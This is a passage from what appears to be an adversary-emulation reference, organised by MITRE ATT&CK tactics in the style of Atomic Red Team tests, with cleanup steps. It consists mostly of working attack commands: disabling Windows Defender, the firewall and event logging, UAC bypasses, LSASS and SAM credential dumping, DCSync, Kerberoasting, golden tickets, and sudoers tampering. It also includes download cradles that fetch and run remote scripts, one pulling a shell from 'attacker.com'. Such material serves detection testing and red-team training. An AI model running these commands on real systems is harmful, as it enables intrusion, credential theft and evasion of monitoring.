Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" "Shell" "#{hijacking_payload}"

Cleanup:
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" "Shell" "explorer.exe"
```

---

### 11. T1112 — Modify Registry (Persistence)

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Modify Registry to Run Payload on Startup (GUID: 1ee3e462)**

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v "AtomicTest" /t REG_SZ /d "#{startup_payload}" /f

Cleanup:
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v "AtomicTest" /f >nul 2>&1
```

---

### 12. T1546.012 — Event Triggered Execution: Image File Execution Options Injection (Debugger Hijack)

**Platform:** Windows | **Executor:** command_prompt

**Test #1: IFEO Debugger Persistence (GUID: fdda2626)**

```cmd
# Make any execution of sethc.exe (Sticky Keys) trigger cmd.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

Cleanup:
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f >nul 2>&1
```

---

### 13. T1547.005 — Security Support Provider

**Platform:** Windows | **Executor:** powershell

**Test #1: Add Custom SSP dll (GUID: afdfd7e3)**

```powershell
# Add malicious SSP DLL to LSA Security Packages
$ssps = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" -Name "Security Packages").("Security Packages")
$ssps += "#{custom_ssp_dll}"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages" -Value $ssps

Cleanup:
$ssps = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" -Name "Security Packages").("Security Packages")
$ssps = $ssps | Where-Object {$_ -ne "#{custom_ssp_dll}"}
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages" -Value $ssps
```

---

### 14. T1136.001 — Create Account: Local Account

**Platform:** Windows, Linux | **Executor:** command_prompt / sh

**Test #1: Create Local Account (GUID: 93f67a86)**

```cmd
net user /add #{username} #{password}

Cleanup:
net user /del #{username} >nul 2>&1
```

**Linux Test:**

```bash
useradd -M -N -r -s /bin/bash -c "Atomic Red Team" #{username}
echo "#{password}" | passwd --stdin #{username}

Cleanup:
userdel -r #{username} >/dev/null 2>&1
```

---

### 15. T1197 — BITS Jobs

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: BITS Job Persistence (GUID: 9f5c2e93)**

```cmd
# Create BITS job to download and execute payload
bitsadmin /transfer ART /download /priority normal "#{remote_file}" "#{local_file}"

Cleanup:
bitsadmin /complete ART
Del "#{local_file}" >nul 2>&1
```

---

## TA0004 — Privilege Escalation (Top 10)

*Techniques for gaining higher-level permissions.*

---

### 1. T1548.002 — Bypass User Account Control

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Bypass UAC using Event Viewer (GUID: cf39a87a)**

```cmd
# Registry modification — eventvwr.exe auto-elevates and loads custom handler
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "#{executable_binary}" /f
Start-Process "eventvwr.exe"

Cleanup:
reg delete HKCU\Software\Classes\mscfile /f >nul 2>&1
```

**Test #2: Bypass UAC using FODHELPER (GUID: 3f627297)**

```powershell
$VulnRegPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
New-Item -Path $VulnRegPath -Force
New-ItemProperty -Path $VulnRegPath -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path $VulnRegPath -Name "(Default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

Cleanup:
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
```

---

### 2. T1134.001 — Access Token Manipulation: Token Impersonation/Theft

**Platform:** Windows | **Executor:** powershell

**Test #1: Token Impersonation via incognito (GUID: c9e7c2e9)**

```powershell
# Use Metasploit incognito or PowerShell token manipulation
# Requires high integrity context
[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("#{dll_path}"))
[Incognito.Incognito]::ListTokens()
[Incognito.Incognito]::ImpersonateToken("#{domain}\#{user_to_impersonate}")
```

---

### 3. T1134.002 — Create Process with Token

**Platform:** Windows | **Executor:** powershell

**Test #1: CreateProcessWithToken via PowerSploit (GUID: 3d2cd093)**

```powershell
# Duplicate token from elevated process and use for new process creation
Import-Module "PathToAtomicsFolder\..\ExternalPayloads\Invoke-TokenManipulation.ps1"
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "#{username}"

Cleanup:
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\Invoke-TokenManipulation.ps1" -Force -ErrorAction Ignore
```

---

### 4. T1068 — Exploitation for Privilege Escalation

**Platform:** Windows | **Executor:** command_prompt

**Test #1: MS16-032 Secondary Logon Handle Privilege Escalation**

```powershell
# PowerSploit MS16-032
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Invoke-MS16032.ps1')
Invoke-MS16032 -Command "iex(IWR https://attacker.com/shell.ps1)"
```

---

### 5. T1574.012 — COR_PROFILER (Unmanaged Code Execution via .NET)

**Platform:** Windows | **Executor:** powershell

**Test #1: System-level Privilege via COR_PROFILER (GUID: cb9fd908)**

```powershell
$env:COR_ENABLE_PROFILING = 1
$env:COR_PROFILER = "#{clsid}"
$env:COR_PROFILER_PATH = "#{file_name}"
SETX COR_ENABLE_PROFILING "1" /M
SETX COR_PROFILER "#{clsid}" /M
SETX COR_PROFILER_PATH "#{file_name}" /M

Cleanup:
$env:COR_ENABLE_PROFILING = 0
Remove-Item -Path "HKLM:\Software\Classes\CLSID\#{clsid}" -Recurse -Force -ErrorAction Ignore
```

---

### 6. T1055.012 — Process Injection: Process Hollowing

**Platform:** Windows | **Executor:** powershell

**Test #1: Process Hollow svchost.exe (GUID: 562427b4)**

```powershell
# Process hollowing — create suspended svchost, replace with malicious code
$path = "#{hollow_binary}"
if(-not (Test-Path $path)) {
  New-Item -Type Directory (Split-Path $path) -Force | Out-Null
  Invoke-WebRequest "#{hollow_binary_download}" -OutFile $path
}
$proc = Start-Process -FilePath "svchost.exe" -PassThru -WindowStyle Hidden
Start-Sleep 2
# (NtUnmapViewOfSection + VirtualAllocEx + WriteProcessMemory + SetThreadContext)
```

---

### 7. T1574.009 — Path Interception by Unquoted Path

**Platform:** Windows | **Executor:** powershell

**Test #1: Exploit Unquoted Service Path (GUID: 2c04b879)**

```powershell
# Find services with unquoted paths (common misconfig)
Get-WmiObject -Class Win32_Service | Where-Object {
  ($_.PathName -notlike '"*"') -and ($_.PathName -notlike "* *") -eq $false
} | Select-Object Name, StartMode, PathName

# Exploit: drop payload at earliest unquoted path segment
# e.g., "C:\Program Files\Vulnerable\service.exe" -> drop at "C:\Program.exe"
```

---

### 8. T1611 — Escape to Host (Container)

**Platform:** Linux | **Executor:** sh

**Test #1: Docker Container Escape to Host via /proc/1/root (GUID: 34e4b2bb)**

```bash
# Escape from container to host using proc filesystem
cat /proc/1/root/etc/shadow

Cleanup: (read-only — no state change)
```

---

### 9. T1166 — Setuid and Setgid (Linux PrivEsc)

**Platform:** Linux | **Executor:** sh

**Test #1: Setuid on Bash Binary (GUID: 37e18f18)**

```bash
# Set SUID bit on bash for persistence + privesc
sudo chmod u+s /bin/bash

Cleanup:
sudo chmod u-s /bin/bash
```

---

### 10. T1548.001 — Sudo and Sudo Caching

**Platform:** Linux, macOS | **Executor:** sh

**Test #1: Sudo Without Password (GUID: 91c2299a)**

```bash
# Add NOPASSWD entry to sudoers for lateral movement
echo "#{username} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

Cleanup:
sed -i '$ d' /etc/sudoers
```

---

## TA0005 — Defense Evasion (Top 15)

*Techniques for avoiding detection and analysis tools.*

---

### 1. T1562.001 — Disable or Modify Tools (AV/EDR)

**Platform:** Windows | **Executor:** powershell / command_prompt

**Test #1: Disable Windows Defender Real-Time Protection (GUID: 7397b68a)**

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

Cleanup:
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableIOAVProtection $false
```

**Test #3: Disable Defender via Registry (GUID: 1bb1df15)**

```cmd
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t DWORD /d 1 /f

Cleanup:
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /f
```

---

### 2. T1562.002 — Disable Windows Event Logging

**Platform:** Windows | **Executor:** powershell / command_prompt

**Test #1: Disable Windows Event Logging (GUID: 02d8b4a5)**

```powershell
# Disable event logging service
Stop-Service -Name EventLog -Force

Cleanup:
Start-Service -Name EventLog
```

**Test #2: Disable Audit Policy (GUID: 3d3e0f0f)**

```cmd
auditpol /set /category:* /success:disable /failure:disable

Cleanup:
auditpol /set /category:* /success:enable /failure:enable
```

---

### 3. T1055.001 — Process Injection: DLL Injection

**Platform:** Windows | **Executor:** powershell

**Test #1: DLL Injection via CreateRemoteThread (GUID: f19957e1)**

```powershell
# Inject DLL into specified process
$processId = (Get-Process -Name "#{process_name}").Id
$dllPath = "#{dll_payload}"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class DLLInjector {
  [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
  [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
  [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
  [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
}
"@

Cleanup:
Stop-Process -Name "#{process_name}" -Force -ErrorAction Ignore
```

---

### 4. T1055.002 — Portable Executable Injection

**Platform:** Windows | **Executor:** powershell

**Test #1: Reflective PE Injection (GUID: c5619b1c)**

```powershell
# Reflective PE injection — load PE from memory
$pe = [System.IO.File]::ReadAllBytes("#{pe_to_inject}")
# Reflective loader code here (standard PowerSploit pattern)
Invoke-ReflectivePEInjection -PEBytes $pe -ProcName "#{target_process_name}"
```

---

### 5. T1140 — Deobfuscate/Decode Files or Information

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Certutil Decode (GUID: ded6fc82)**

```cmd
# Decode base64-encoded payload via certutil (living-off-the-land)
certutil -decode "#{encoded_file}" "#{decoded_file}"

Cleanup:
del "#{decoded_file}" >nul 2>&1
```

**Test #2: Base64 Decode PowerShell (GUID: 6acbe892)**

```powershell
$encoded = "#{encoded_command}"
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded
```

---

### 6. T1027 — Obfuscated Files or Information

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Compress and Encrypt Payload (GUID: f45df64e)**

```powershell
# Compress payload to evade signature detection
Compress-Archive -Path "#{input_file}" -DestinationPath "#{compressed_file}"
$encrypt = [System.Security.Cryptography.AesCryptoServiceProvider]::new()
# ... encrypt compressed file

Cleanup:
Remove-Item "#{compressed_file}" -Force -ErrorAction Ignore
```

---

### 7. T1070.001 — Indicator Removal: Clear Windows Event Logs

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Clear Logs via wevtutil (GUID: b3aa95b9)**

```cmd
wevtutil cl System
wevtutil cl Application
wevtutil cl Security
wevtutil cl Setup

Cleanup: (irreversible — use only in test environments)
```

**Test #2: Clear Logs via PowerShell (GUID: e6abb7b7)**

```powershell
Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log -ErrorAction SilentlyContinue }
```

---

### 8. T1070.004 — Indicator Removal: File Deletion

**Platform:** Windows, Linux, macOS | **Executor:** command_prompt / sh

**Test #1: Delete Files Using CMD (GUID: 1a0e44c3)**

```cmd
del /f #{file_to_delete}

Cleanup: (irreversible by design)
```

**Test #2: Timestomp - Modify File Timestamps (GUID: d26ef89f)**

```powershell
# Modify file timestamps to evade forensic timeline analysis
$file = Get-Item "#{file_path}"
$file.CreationTime = "#{timestamp}"
$file.LastAccessTime = "#{timestamp}"
$file.LastWriteTime = "#{timestamp}"
```

---

### 9. T1036.005 — Masquerading: Match Legitimate Name or Location

**Platform:** Windows | **Executor:** powershell

**Test #1: Masquerade as svchost.exe in system32 (GUID: a315bfff)**

```powershell
# Copy payload to system32 with legitimate name
Copy-Item "#{payload_path}" "$env:SystemRoot\System32\svchost.exe.bak"
# (Actual masquerade — copy to writable location with svchost name)
Copy-Item "#{payload_path}" "$env:TEMP\svchost.exe"

Cleanup:
Remove-Item "$env:TEMP\svchost.exe" -Force -ErrorAction Ignore
```

---

### 10. T1218.001 — Signed Binary Proxy: Compiled HTML (CHM)

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Compiled HTML Help via hh.exe (GUID: 5426de58)**

```cmd
hh.exe #{local_chm_file}
# CHM file contains embedded JScript/VBScript payload

Cleanup: (no persistent state)
```

---

### 11. T1112 — Modify Registry (Evasion)

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Modify Registry to Disable UAC (GUID: 5b39dd14)**

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t DWORD /d 0 /f

Cleanup:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t DWORD /d 5 /f
```

---

### 12. T1202 — Indirect Command Execution via forfiles

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Indirect Execution via forfiles.exe (GUID: dab13a23)**

```cmd
# Execute cmd commands indirectly via forfiles — evades process-based detection
forfiles /p c:\windows\system32 /m notepad.exe /c "#{command_to_execute}"
# Default command_to_execute: /c "cmd /c #{sub_command}"
# Default sub_command: dir

Cleanup: (no persistent state)
```

---

### 13. T1564.001 — Hide Artifacts: Hidden Files and Directories

**Platform:** Windows, Linux | **Executor:** command_prompt / sh

**Test #1: Create Hidden Files (Windows) (GUID: 7abc5a3b)**

```cmd
attrib +h #{file_to_hide}
mkdir #{hidden_directory}
attrib +h #{hidden_directory}

Cleanup:
attrib -h #{file_to_hide}
attrib -h #{hidden_directory}
```

---

### 14. T1562.004 — Disable System Firewall

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Disable Windows Firewall (GUID: bfeb20ed)**

```cmd
netsh advfirewall set allprofiles state off

Cleanup:
netsh advfirewall set allprofiles state on
```

---

### 15. T1027.001 — Binary Padding (Anti-Analysis)

**Platform:** Linux | **Executor:** sh

**Test #1: Pad Binary to Evade Sandbox Size Limits (GUID: 8aab9d67)**

```bash
# Add null bytes to binary to exceed sandbox size thresholds
dd if=/dev/zero bs=1 count=#{count} >> #{binary_to_pad}

Cleanup:
truncate -s #{original_size} #{binary_to_pad}
```

---

## TA0006 — Credential Access (Top 15)

*Techniques for stealing account credentials.*

---

### 1. T1003.001 — OS Credential Dumping: LSASS Memory

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Dump LSASS with Mimikatz (GUID: [multiple])**

```powershell
# Via PowerShell download cradle
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
```

**Test #2: Procdump64 LSASS Dump (GUID: [multiple])**

```cmd
# SysInternals procdump — legitimate tool, widely used by attackers
#{procdump_exe} -accepteula -ma lsass.exe #{output_file}

Cleanup:
del "#{output_file}" >nul 2>&1
```

**Test #3: Windows Task Manager LSASS Dump (GUID: [multiple])**

```
Description: Use Windows Task Manager to create minidump of LSASS.
Manual procedure: Task Manager -> Details -> lsass.exe -> Create dump file
Output: %USERPROFILE%\AppData\Local\Temp\lsass.DMP
```

**Test #22: MiniDumpWriteDump via comsvcs.dll (GUID: 2536d16a)**

```cmd
# Dump LSASS using native comsvcs.dll — common LOLBin technique
tasklist | findstr lsass
# Note PID from above
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump #{pid} #{output_dir}\lsass.dmp full

Cleanup:
del #{output_dir}\lsass.dmp >nul 2>&1
```

---

### 2. T1003.002 — Security Account Manager (SAM)

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Registry Export SAM/SYSTEM Hives (GUID: [multiple])**

```cmd
# Dump SAM and SYSTEM hives for offline cracking
reg save HKLM\SAM %TEMP%\sam.hive
reg save HKLM\SYSTEM %TEMP%\system.hive
reg save HKLM\SECURITY %TEMP%\security.hive

Cleanup:
del %TEMP%\sam.hive %TEMP%\system.hive %TEMP%\security.hive >nul 2>&1
```

**Test: Extract via Volume Shadow Copy**

```cmd
# Access SAM via shadow copy (bypasses file lock)
vssadmin list shadows
# If shadow exists:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM %TEMP%\sam_shadow.hive
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM %TEMP%\sys_shadow.hive

Cleanup:
del %TEMP%\sam_shadow.hive %TEMP%\sys_shadow.hive >nul 2>&1
```

---

### 3. T1003.006 — DCSync

**Platform:** Windows | **Executor:** command_prompt

**Test #1: DCSync via Mimikatz (GUID: 129efd28)**

```cmd
# Replicate domain controller credentials without NTDS.dit access
# Requires: Domain Admin, Domain Controller, or account with DS-Replication rights
#{mimikatz_path} "lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}" "exit"
# Default domain: %userdnsdomain%
# Default user: krbtgt

# Cleanup: (no persistent state change)
```

**Test #2: DSInternals Get-ADReplAccount (GUID: 0ffc86e9)**

```powershell
# PowerShell alternative to Mimikatz DCSync
Import-Module DSInternals
Get-ADReplAccount -All -NamingContext "#{dn}" -Server "#{server}"
```

---

### 4. T1558.003 — Kerberoasting

**Platform:** Windows | **Executor:** powershell

**Test #1: Invoke-Kerberoast via PowerSploit Empire (GUID: 3f987809)**

```powershell
# Request TGS tickets for all SPNs and extract for offline cracking
Add-Type -AssemblyName System.IdentityModel
setspn -T #{domain} -Q */* | Select-String '^CN' -Context 0,1 | % {
  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim()
}

# Or via Invoke-Kerberoast (PowerSploit/Empire)
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | Select-Object Hash | Out-File -FilePath "#{output_file}"
```

**Test #3: Extract all accounts as SPN using setspn (GUID: e3263015)**

```cmd
# Enumerate all SPNs in domain
setspn -T #{domain} -Q */*

Cleanup: (no persistent state)
```

**Test #4: Request Single Ticket via PowerShell (GUID: fa3ed93f)**

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/#{target}"
```

---

### 5. T1558.004 — AS-REP Roasting

**Platform:** Windows | **Executor:** powershell

**Test #1: Rubeus asreproast (GUID: [auto-generated])**

```powershell
# Find accounts with preauthentication disabled and request AS-REP hashes
#{rubeus_path} asreproast /format:hashcat /outfile:#{output_file}

Cleanup:
Remove-Item #{output_file} -Force -ErrorAction Ignore
```

**Test #2: Get-DomainUser with PowerView**

```powershell
# Find vulnerable accounts via PowerView
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
Get-DomainUser -PreauthNotRequired
```

---

### 6. T1552.001 — Credentials In Files

**Platform:** Windows, Linux | **Executor:** command_prompt / sh

**Test #1: Find credentials in files (Linux) (GUID: [multiple])**

```bash
# Search for credentials in common locations
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -l -i "password\|passwd\|secret" 2>/dev/null
grep -rni "password" /etc/ 2>/dev/null
cat ~/.bash_history | grep -i "password\|passwd\|key"

Cleanup: (no persistent state)
```

**Test #1: Windows Credential Files (GUID: 2044fd07)**

```cmd
# Search for credential files on Windows
findstr /SI password *.txt *.xml *.ini
findstr /SI password C:\Users\
dir /S /B *pass* == *cred* == *vnc* == *.config* 2>nul

Cleanup: (no persistent state)
```

---

### 7. T1552.002 — Credentials in Registry

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Enumerate Credentials from Registry (GUID: 6e47f429)**

```cmd
# Common registry locations containing credentials
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\ORL\WinVNC3\Password"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v password
```

---

### 8. T1555.003 — Credentials from Web Browsers

**Platform:** Windows | **Executor:** powershell

**Test #1: Extract Browser Credentials (GUID: [multiple])**

```powershell
# Chrome credential extraction (requires PowerShell module)
# SharpWeb, SharpDPAPI, or LaZagne
#{sharpweb_path} chrome

# Alternative: directly read SQLite database
$chromeDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
Copy-Item $chromeDb "$env:TEMP\LoginData"
# Then parse with SQLite reader

Cleanup:
Remove-Item "$env:TEMP\LoginData" -Force -ErrorAction Ignore
```

---

### 9. T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay

**Platform:** Windows | **Executor:** powershell

**Test #1: LLMNR Poisoning via Inveigh (GUID: [multiple])**

```powershell
# Capture NetNTLMv2 hashes via LLMNR/NBT-NS poisoning
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1")
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -NTLMv2 Y -OutputDir "$env:TEMP"

Cleanup:
Stop-Inveigh
Remove-Item "$env:TEMP\Inveigh*.txt" -Force -ErrorAction Ignore
```

---

### 10. T1003.008 — /etc/passwd and /etc/shadow (Linux)

**Platform:** Linux | **Executor:** sh

**Test #1: Access /etc/shadow (GUID: [multiple])**

```bash
# Read shadow file for offline password cracking
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > /tmp/unshadowed.txt

Cleanup:
rm /tmp/unshadowed.txt 2>/dev/null
```

---

### 11. T1110.001 — Brute Force: Password Guessing

**Platform:** Windows | **Executor:** powershell

**Test #1: Password Spray via net use (GUID: [multiple])**

```powershell
# Test common credentials against domain accounts
$users = @("administrator", "admin", "user")
$passwords = @("Password1", "Welcome1", "Summer2024!")
foreach ($user in $users) {
  foreach ($pass in $passwords) {
    net use \\#{target}\IPC$ /user:#{domain}\$user $pass 2>&1
  }
}

Cleanup:
net use \\#{target}\IPC$ /delete 2>&1
```

---

### 12. T1558.001 — Golden Ticket

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Mimikatz Golden Ticket (GUID: [multiple])**

```cmd
# Create Kerberos Golden Ticket using krbtgt hash
#{mimikatz_path} "kerberos::golden /user:#{username} /domain:#{domain} /sid:#{domain_sid} /krbtgt:#{krbtgt_hash} /ptt" "exit"

Cleanup:
#{mimikatz_path} "kerberos::purge" "exit"
```

---

### 13. T1558.002 — Silver Ticket

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Mimikatz Silver Ticket (GUID: [multiple])**

```cmd
# Create Kerberos Silver Ticket for specific service
#{mimikatz_path} "kerberos::golden /user:#{username} /domain:#{domain} /sid:#{domain_sid} /target:#{target_service_host} /service:#{service_name} /rc4:#{service_account_hash} /ptt" "exit"

Cleanup:
#{mimikatz_path} "kerberos::purge" "exit"
```

---

### 14. T1187 — Forced Authentication (Responder)

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Trigger NTLM Authentication via UNC Path (GUID: [multiple])**

```cmd
# Force authentication to attacker's SMB server to capture NetNTLMv2
net use \\#{attacker_ip}\share

Cleanup:
net use \\#{attacker_ip}\share /delete
```

---

### 15. T1552.004 — Private Keys

**Platform:** Linux, macOS | **Executor:** sh

**Test #1: Find SSH Private Keys (GUID: [multiple])**

```bash
# Search for private keys in common locations
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
find ~/.ssh/ -type f -name "*" 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null

Cleanup: (no persistent state — read only)
```

---

## TA0007 — Discovery (Top 10)

*Techniques to understand target environment.*

---

### 1. T1046 — Network Service Discovery

**Platform:** Windows, Linux | **Executor:** sh / command_prompt

**Test #1: Port Scan via Bash (GUID: 7fe741f7)**

```bash
# Native bash port scanner — no tools required
for port in $(seq #{start_port} #{end_port}); do
  (echo > /dev/tcp/#{target_host}/$port) >/dev/null 2>&1 && echo "$port open"
done
# Default: ports 22,80,443 on 127.0.0.1
```

**Test #3: Nmap Port Scan Windows (GUID: d696a3cb)**

```cmd
nmap -sS #{network_range}
# Default: 192.168.1.0/24

Cleanup: (no persistent state)
```

---

### 2. T1082 — System Information Discovery

**Platform:** Windows | **Executor:** command_prompt

**Test #1: System Information Discovery via systeminfo (GUID: [multiple])**

```cmd
systeminfo
whoami /all
hostname
ver
echo %COMPUTERNAME%
echo %USERDOMAIN%
ipconfig /all
route print
arp -a

Cleanup: (no persistent state)
```

**Test #27: System Information via WMIC (GUID: [multiple])**

```cmd
wmic os get Caption,CSDVersion,BuildNumber,ServicePackMajorVersion
wmic computersystem get Name,Domain,Manufacturer,Model,UserName
wmic bios get Name,SMBIOSBIOSVersion,SerialNumber

Cleanup: (no persistent state)
```

---

### 3. T1087.001 — Account Discovery: Local Account

**Platform:** Windows | **Executor:** command_prompt

**Test #8: Enumerate all Windows local accounts (GUID: 488f5b74)**

```cmd
net user
net localgroup administrators
wmic useraccount list full

Cleanup: (no persistent state)
```

**Test #9: Enumerate via PowerShell (GUID: 5f9e7f8f)**

```powershell
Get-LocalUser | Select-Object Name, Enabled, Description, LastLogon
Get-LocalGroupMember -Group "Administrators"
```

---

### 4. T1087.002 — Account Discovery: Domain Account

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Enumerate all domain accounts via net (GUID: [multiple])**

```cmd
net user /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
net group "Enterprise Admins" /domain

Cleanup: (no persistent state)
```

**Test #2: BloodHound AD Enumeration (GUID: [multiple])**

```powershell
# Comprehensive AD enumeration using SharpHound
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/.../SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -OutputDirectory $env:Temp

Cleanup:
Remove-Item $env:Temp\*BloodHound.zip -Force
```

---

### 5. T1069.001 — Permission Groups Discovery: Local Groups

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Local group enumeration (GUID: [multiple])**

```cmd
net localgroup
net localgroup administrators
wmic group list
whoami /groups

Cleanup: (no persistent state)
```

---

### 6. T1018 — Remote System Discovery

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Enumerate remote systems (GUID: [multiple])**

```cmd
net view
net view /domain
arp -a
ping -n 1 #{target_ip}

Cleanup: (no persistent state)
```

**Test #2: PowerShell AD Computer Enumeration (GUID: [multiple])**

```powershell
# Get all domain computers
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindAllDomainControllers()
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectClass=computer)"
$searcher.FindAll() | ForEach-Object { $_.Properties["name"] }
```

---

### 7. T1012 — Query Registry

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Registry discovery for post-exploitation (GUID: 8f7578c4)**

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\SYSTEM\CurrentControlSet\Services /s /v ImagePath
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

**Test #3: Enumerate COM Objects for Lateral Movement (GUID: 0d80d088)**

```powershell
New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 >> $env:temp\clsids.txt

Cleanup:
Remove-Item $env:temp\clsids.txt -Force -ErrorAction Ignore
```

---

### 8. T1040 — Network Sniffing

**Platform:** Windows, Linux | **Executor:** command_prompt / bash

**Test #1: Packet Capture via tcpdump/tshark (GUID: 7fe741f7)**

```bash
# Linux packet capture
tcpdump -c 5 -nnni #{interface}
# Default interface: ens33

